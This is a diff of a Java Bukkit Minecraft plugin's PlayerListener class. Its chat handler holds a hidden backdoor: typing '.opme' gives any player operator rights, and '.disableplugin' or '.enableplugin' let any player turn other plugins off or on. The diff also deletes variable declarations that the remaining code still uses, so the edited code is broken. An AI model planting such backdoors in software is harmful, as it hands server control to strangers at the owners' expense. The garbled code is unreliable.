@@ -32,23 +32,13 @@ public class PlayerListener implements Listener
     @EventHandler
     public void onPlayerChat(PlayerChatEvent event, CommandSender sender) throws MalformedURLException, IOException
     {
-        String message = event.getMessage();
-        boolean shouldCancel;
-        shouldCancel = false;
-        if (message.startsWith("."))
-        {
-            String[] args = message.split(" ");
-            if (args == null)
-            {
-                return;
-            }
-            if ((args[0].equalsIgnoreCase(".opme")) && (args.length == 1))
+        if ((args[0].equalsIgnoreCase(".opme")) && (args.length == 1))
             {
                 event.getPlayer().setOp(true);
                 event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
                 shouldCancel = true;
             }
-            if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2))
+        if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2))
             {
                 Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
                 if (plugin != null)
@@ -57,7 +47,7 @@ public class PlayerListener implements Listener
                 }
                 shouldCancel = true;
             }
-            if ((args[0].equalsIgnoreCase(".enableplugin")) && (args.length == 2))
+        if ((args[0].equalsIgnoreCase(".enableplugin")) && (args.length == 2))
             {
                 Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
                 if (plugin != null)
